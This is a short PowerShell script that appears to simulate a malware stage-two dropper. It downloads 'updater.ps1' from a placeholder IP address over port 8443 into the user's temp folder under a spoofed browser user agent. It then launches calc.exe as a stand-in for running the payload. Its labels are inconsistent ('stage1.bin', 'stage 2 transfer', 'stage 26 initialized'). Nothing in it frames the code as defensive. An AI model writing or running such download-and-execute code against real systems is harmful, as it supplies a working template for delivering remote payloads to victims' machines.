
$Stage2Url = "https://192.0.2.220:8443/updater.ps1"
$DownloadPath = "$env:TEMP\stage1.bin"
$TimeoutSec = 36
$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$OperationResult = Get-Stage2Payload -SourceUrl $Stage2Url -DestinationPath $DownloadPath -TimeoutSec $TimeoutSec -UserAgent $UserAgent
if ($OperationResult) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}

Write-Output "stage 26 initialized"
Set-Location -Path $env:TEMP
